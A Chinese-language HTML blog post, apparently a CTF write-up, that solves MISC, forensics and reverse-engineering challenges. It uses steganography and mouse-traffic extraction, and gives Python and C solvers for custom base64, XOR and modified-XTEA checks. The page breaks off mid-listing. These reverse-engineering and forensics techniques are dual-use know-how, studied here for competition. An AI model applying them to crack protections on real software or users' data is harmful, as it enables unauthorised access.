<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>🐏🍊🏆 Writeup | devoke's blog</title><meta name="author" content="devoke"><meta name="copyright" content="devoke"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="​	刚好差一名，有点可惜。 MISC签到题嗯猜 28-08-30-07-04-20-02-17-23-01-12-19 misc520binwalk -e -M -d&amp;#x3D;500递归解压，150.zip发现 123456这都被你发现了？我这故事不错吧，嘻嘻嘻那就把flag给你吧oh，不，还有一半藏在了p"><link rel="shortcut icon" href="https://s2.loli.net/2024/02/20/B6y8wIH5iltGxP9.png"><link rel="canonical" href="http://example.com/2021/09/12/WriteUp/%F0%9F%90%8F%F0%9F%8D%8A%F0%9F%8F%86-Writeup/index.html"><link rel="preconnect"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="/"><link rel="stylesheet" href="/" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: '/',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: ,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '🐏🍊🏆 Writeup',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: false,
  postUpdate: '2024-02-20 10:04:53'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2024/05/04/Zav4zFVukLJMBKI.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://s2.loli.net/2024/02/20/h3iOcSdRqel45vD.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="devoke's blog"><span class="site-name">devoke's blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">🐏🍊🏆 Writeup</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-09-12T14:12:42.000Z" title="发表于 2021-09-12 22:12:42">2021-09-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-02-20T02:04:53.000Z" title="更新于 2024-02-20 10:04:53">2024-02-20</time></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>​	刚好差一名，有点可惜。</p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>嗯猜</p>
<p>28-08-30-07-04-20-02-17-23-01-12-19</p>
<h2 id="misc520"><a href="#misc520" class="headerlink" title="misc520"></a>misc520</h2><p><code>binwalk -e -M -d=500</code>递归解压，150.zip发现</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">这都被你发现了？</span><br><span class="line">我这故事不错吧，嘻嘻嘻</span><br><span class="line">那就把flag给你吧</span><br><span class="line">oh，不，还有一半藏在了pcap的心里，快去找找吧</span><br><span class="line">左心房右心房，扑通扑通的心，咿呀咿呀的❤</span><br><span class="line">72, 89, 75, 88, 128, 93, 58, 116, 76, 121, 120, 63, 108,</span><br></pre></td></tr></table></figure>

<p>全部解压得到flag.png ,根据提示用zsteg 提取得到flag.pcap</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">zsteg -a flag.png</span><br><span class="line">imagedata           .. text: <span class="string">&quot;\n\n\n\n\t\n\n\n\n&quot;</span></span><br><span class="line">b1,r,lsb,xy         .. file: raw G3 (Group 3) FAX, byte-padded</span><br><span class="line">b1,bgr,lsb,xy       .. text: <span class="string">&quot;flag.pcap&quot;</span></span><br><span class="line">b2,r,lsb,xy         .. text: <span class="string">&quot;EPADE@@T@&quot;</span></span><br></pre></td></tr></table></figure>

<p>显然是鼠标流量，参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43625917/article/details/107723635">https://blog.csdn.net/qq_43625917/article/details/107723635</a> 提取左键右键轨迹可以得到差不多的一组数字。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c = [<span class="number">72</span>, <span class="number">89</span>, <span class="number">75</span>, <span class="number">88</span>, <span class="number">128</span>, <span class="number">93</span>, <span class="number">58</span>, <span class="number">116</span>, <span class="number">76</span>, <span class="number">121</span>, <span class="number">120</span>, <span class="number">63</span>, <span class="number">108</span>, <span class="number">130</span>,<span class="number">63</span>,<span class="number">111</span>, <span class="number">94</span> ,<span class="number">51</span> ,<span class="number">134</span> ,<span class="number">119</span> ,<span class="number">146</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">chr</span>(c[i]-i-<span class="number">1</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#GWHT&#123;W3lCom3_t0_M!sc&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="Baby-Forenisc"><a href="#Baby-Forenisc" class="headerlink" title="Baby_Forenisc"></a>Baby_Forenisc</h2><p>consoles 可以发现如下hint</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Cmd <span class="comment">#0 at 0x3689ed8: git push -u origin master</span></span><br><span class="line">Cmd <span class="comment">#1 at 0x566148: ok....</span></span><br><span class="line">Cmd <span class="comment">#2 at 0x56aa08: then delete .git and flagfile</span></span><br><span class="line">Cmd <span class="comment">#3 at 0x368a798: You can never find my account</span></span><br><span class="line">Cmd <span class="comment">#4 at 0x56a580: hahaha!</span></span><br></pre></td></tr></table></figure>

<p>提取桌面ssh.txt base64 decode得到<a href="mailto:&#x73;&#111;&#x6e;&#x67;&#x35;&#53;&#x32;&#48;&#56;&#x35;&#x31;&#x30;&#55;&#64;&#113;&#113;&#x2e;&#99;&#111;&#x6d;">&#x73;&#111;&#x6e;&#x67;&#x35;&#53;&#x32;&#48;&#56;&#x35;&#x31;&#x30;&#55;&#64;&#113;&#113;&#x2e;&#99;&#111;&#x6d;</a> Github搜索可以发现有一个仓库有<code>_APP_</code>文件，wuWxapkg.js反编译得到Index.wxml，b64得到</p>
<blockquote>
<p>SangFor{S0_3azy_2_crack_noob_player}</p>
</blockquote>
<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="babysmc"><a href="#babysmc" class="headerlink" title="babysmc"></a>babysmc</h2><p>异或base64</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="string">b&#x27;H&gt;oQn6aqLr&#123;DH6odhdm0dMe`MBo?lRglHtGPOdobDlknejmGI|ghDb&lt;4&#x27;</span></span><br><span class="line"></span><br><span class="line">table = [ <span class="number">0xE4</span>, <span class="number">0xC4</span>, <span class="number">0xE7</span>, <span class="number">0xC7</span>, <span class="number">0xE6</span>, <span class="number">0xC6</span>, <span class="number">0xE1</span>, <span class="number">0xC1</span>, <span class="number">0xE0</span>, <span class="number">0xC0</span>, </span><br><span class="line">  <span class="number">0xE3</span>, <span class="number">0xC3</span>, <span class="number">0xE2</span>, <span class="number">0xC2</span>, <span class="number">0xED</span>, <span class="number">0xCD</span>, <span class="number">0xEC</span>, <span class="number">0xCC</span>, <span class="number">0xEF</span>, <span class="number">0xCF</span>, </span><br><span class="line">  <span class="number">0xEE</span>, <span class="number">0xCE</span>, <span class="number">0xE9</span>, <span class="number">0xC9</span>, <span class="number">0xE8</span>, <span class="number">0xC8</span>, <span class="number">0xEB</span>, <span class="number">0xCB</span>, <span class="number">0xEA</span>, <span class="number">0xCA</span>, </span><br><span class="line">  <span class="number">0xF5</span>, <span class="number">0xD5</span>, <span class="number">0xF4</span>, <span class="number">0xD4</span>, <span class="number">0xF7</span>, <span class="number">0xD7</span>, <span class="number">0xF6</span>, <span class="number">0xD6</span>, <span class="number">0xF1</span>, <span class="number">0xD1</span>, </span><br><span class="line">  <span class="number">0xF0</span>, <span class="number">0xD0</span>, <span class="number">0xF3</span>, <span class="number">0xD3</span>, <span class="number">0xF2</span>, <span class="number">0xD2</span>, <span class="number">0xFD</span>, <span class="number">0xDD</span>, <span class="number">0xFC</span>, <span class="number">0xDC</span>, </span><br><span class="line">  <span class="number">0xFF</span>, <span class="number">0xDF</span>, <span class="number">0x95</span>, <span class="number">0x9C</span>, <span class="number">0x9D</span>, <span class="number">0x92</span>, <span class="number">0x93</span>, <span class="number">0x90</span>, <span class="number">0x91</span>, <span class="number">0x96</span>, </span><br><span class="line">  <span class="number">0x97</span>, <span class="number">0x94</span>, <span class="number">0x8A</span>, <span class="number">0x8E</span>]</span><br><span class="line"></span><br><span class="line">c2= []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(c),<span class="number">4</span>):</span><br><span class="line">	c2.append(c[i]^<span class="number">0xa6</span>)</span><br><span class="line">	c2.append(c[i+<span class="number">1</span>]^<span class="number">0xa3</span>)</span><br><span class="line">	c2.append(c[i+<span class="number">2</span>]^<span class="number">0xa9</span>)</span><br><span class="line">	c2.append(c[i+<span class="number">3</span>]^<span class="number">0xac</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytearray</span>(c2))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c2:</span><br><span class="line">	idx = -<span class="number">1</span></span><br><span class="line">	<span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">64</span>):</span><br><span class="line">		<span class="keyword">if</span>(i==table[k]):</span><br><span class="line">			idx = k</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	b += <span class="built_in">bin</span>(idx)[<span class="number">2</span>:].rjust(<span class="number">6</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure>



<h2 id="Ezandroid"><a href="#Ezandroid" class="headerlink" title="Ezandroid"></a>Ezandroid</h2><p>admin 654321</p>
<p>动调得到b64表<code>TGtUnkaJD0frq61uCQYw3-FxMiRvNOB/EWjgVcpKSzbs8yHZ257X9LldIeh4APom</code> 直接解即可。</p>
<h2 id="DeltX"><a href="#DeltX" class="headerlink" title="DeltX"></a>DeltX</h2><p>前面一大堆是十六进制字符转数字</p>
<p>后面是x-y &#x3D;t1和x*y&#x3D;t2 解方程作为输入即可，中间有两个小写要注意下</p>
<h2 id="safe-box"><a href="#safe-box" class="headerlink" title="safe_box"></a>safe_box</h2><p>爆破 pwd1  &#x3D;&#x3D; 1915969329</p>
<p>pwd2 是个XTEA变种</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span>  </span></span><br><span class="line"><span class="type">uint32_t</span> str[<span class="number">4</span>] = &#123;<span class="number">71</span>,<span class="number">87</span>,<span class="number">72</span>,<span class="number">84</span>&#125;;</span><br><span class="line"><span class="comment">//加密函数  </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">encrypt</span><span class="params">(<span class="type">uint32_t</span> * v)</span> &#123;</span><br><span class="line">        <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>],sum = <span class="number">0</span>, i;           <span class="comment">/* set up */</span>                   <span class="comment">/* a key schedule constant */</span></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;                       <span class="comment">/* basic cycle start */</span></span><br><span class="line">                v0 += ((sum + str[(sum &amp; <span class="number">3</span>)]) ^ (v1 + ((<span class="number">32</span> * v1) ^ (v1 &gt;&gt; <span class="number">6</span>))));</span><br><span class="line">                sum += <span class="number">0x12345678</span>;</span><br><span class="line">                v1 += ((sum + str[((sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>)]) ^ (v0 + ((<span class="number">32</span> * v0) ^ (v0 &gt;&gt; <span class="number">6</span>))));</span><br><span class="line">        &#125;                                              <span class="comment">/* end cycle */</span></span><br><span class="line">        v[<span class="number">0</span>] = v0; v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//解密函数  </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span><span class="params">(<span class="type">uint32_t</span>* v)</span> &#123;</span><br><span class="line">        <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0x468acf00</span>, i;  <span class="comment">/* set up */</span></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;                         <span class="comment">/* basic cycle start */</span></span><br><span class="line">                v1 -= ((sum + str[((sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>)]) ^ (v0 + ((<span class="number">32</span> * v0) ^ (v0 &gt;&gt; <span class="number">6</span>))));</span><br><span class="line">                sum -= <span class="number">0x12345678</span>;</span><br><span class="line">                v0 -= ((sum + str[sum &amp; <span class="number">3</span>]) ^ (v1 + ((<span class="number">32</span> * v1) ^ (v1 &gt;&gt; <span class="number">6</span>))));</span><br><span class="line">        &#125;                                              <span class="comment">/* end cycle */</span></span><br><span class="line">        v[<span class="number">0</span>] = v0; v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">uint32_t</span> v[<span class="number">10</span>] = &#123; <span class="number">0x36C128C5</span>,<span class="number">0x0C4799A63</span>,<span class="number">0x0E8013E6C</span>,<span class="number">0x0A9F49003</span>,<span class="number">0x607EF54A</span>,<span class="number">0x542C2DDF</span>,<span class="number">0x558BD01C</span>,<span class="number">0x65512CA2</span>,<span class="number">0x0BE1E3D05</span>,<span class="number">0x3C467DAD</span> &#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i += <span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                decrypt(v + i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//printf(&quot;%s&quot;, (unsigned char * )v);</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, *((<span class="type">unsigned</span> <span class="type">char</span> *)v + <span class="number">4</span>*i));</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="comment">//S_s0_fuNny</span></span><br></pre></td></tr></table></figure>

<p>第三个验证有一些混淆，动调发现就是ROR和异或什么的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">cmp_data = [</span><br><span class="line">    <span class="number">4263</span>, <span class="number">16242</span>, <span class="number">16703</span>, <span class="number">12130</span>, <span class="number">5594</span>, <span class="number">23568</span>, <span class="number">5963</span>, <span class="number">27755</span>, <span class="number">14298</span>, <span class="number">13907</span>, <span class="number">4612</span>, <span class="number">464</span>, <span class="number">6627</span>, <span class="number">13470</span>, <span class="number">24802</span>, <span class="number">16575</span>, <span class="number">6941</span>, <span class="number">28553</span>, <span class="number">3420</span>, <span class="number">32051</span>, <span class="number">14213</span>, <span class="number">3772</span>, <span class="number">16664</span>, <span class="number">20519</span>, <span class="number">6410</span>, <span class="number">4920</span>, <span class="number">29943</span>, <span class="number">17232</span>, <span class="number">14231</span>, <span class="number">7611</span>, <span class="number">9303</span>, <span class="number">8088</span></span><br><span class="line">]</span><br><span class="line">rand_data = [<span class="number">0x4147</span>, <span class="number">0x2f06</span>, <span class="number">0x5017</span>, <span class="number">0x7d6c</span>, <span class="number">0x1583</span>, <span class="number">0x37ea</span>, <span class="number">0x6fdc</span>, <span class="number">0xd03</span>, <span class="number">0x3f43</span>, <span class="number">0x4156</span>, <span class="number">0xed7</span>, <span class="number">0x1094</span>, <span class="number">0x5c4f</span>, <span class="number">0x173f</span>, <span class="number">0x193a</span>, <span class="number">0x1357</span>,</span><br><span class="line">             <span class="number">0x6c6b</span>, <span class="number">0x37da</span>, <span class="number">0x74f7</span>, <span class="number">0x3653</span>, <span class="number">0x4350</span>, <span class="number">0x3797</span>, <span class="number">0x1dbb</span>, <span class="number">0x2457</span>, <span class="number">0x1f98</span>, <span class="number">0x1204</span>, <span class="number">0x19e3</span>, <span class="number">0x1d0</span>, <span class="number">0x349e</span>, <span class="number">0x60e2</span>, <span class="number">0x40bf</span>, <span class="number">0x1b1d</span>]</span><br><span class="line"></span><br><span class="line">index_data = [-<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ror</span>(<span class="params">x, n</span>):</span><br><span class="line">    <span class="keyword">return</span> ((x &gt;&gt; n) | (x &lt;&lt; (<span class="number">16</span>-n))) &amp; <span class="number">0xffff</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>, <span class="built_in">len</span>(rand_data)):</span><br><span class="line">    rand_data[i] = ror(rand_data[i], <span class="number">0xC</span>) &amp; <span class="number">0x1f</span></span><br><span class="line"></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>, <span class="built_in">len</span>(rand_data)):</span><br><span class="line">    tmp = rand_data[i]</span><br><span class="line">    <span class="keyword">while</span> tmp &lt; <span class="number">0x20</span>:</span><br><span class="line">        <span class="keyword">if</span> tmp <span class="keyword">not</span> <span class="keyword">in</span> index_data:</span><br><span class="line">            index_data[k] = tmp</span><br><span class="line">            k += <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        tmp += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(cmp_data[index_data[i]] ^ rand_data[i]), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"> <span class="comment"># _d0_YoU_1ik3_t0o</span></span><br></pre></td></tr></table></figure>



<p>EZvm</p>
<p>动调 写一个解释器</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span 